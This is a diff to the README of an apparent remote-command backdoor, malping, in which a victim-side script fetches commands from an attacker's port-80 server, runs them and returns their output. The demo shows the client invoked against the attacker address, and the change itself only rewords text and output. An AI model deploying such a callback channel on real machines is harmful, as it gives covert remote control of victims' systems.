@@ -13,9 +13,9 @@ for a command to execute, based on arguments passed to `mp_server.py`.
 `malping.py` will obediently execute the command and send the stdout back to
 the server.
 
-The server runs on port 80 of the attacker's machine and since that is the
-commonly used port for web traffic, it is highly likely the victim will be able
-to connect back.
+The server runs on port 80 of the attacker's machine by default and since that
+is the commonly used port for web traffic, it is highly likely the victim will
+be able to connect back.
 
 ## demo
 
@@ -31,7 +31,7 @@ Victim's Machine (5.4.3.2):
 
 ```
 $ ./malping.py 1.2.3.4 5
-[+] Malping started with delay of 5 seconds.
+[+] Malping started with delay of 5 seconds to port 80. Ctrl-c to exit.
 [!] (2014-05-07 21:52:29.475144) Could not connect to server. Waiting...
 [!] (2014-05-07 21:52:34.475740) Could not connect to server. Waiting...
 [!] (2014-05-07 21:52:39.475874) Could not connect to server. Waiting...
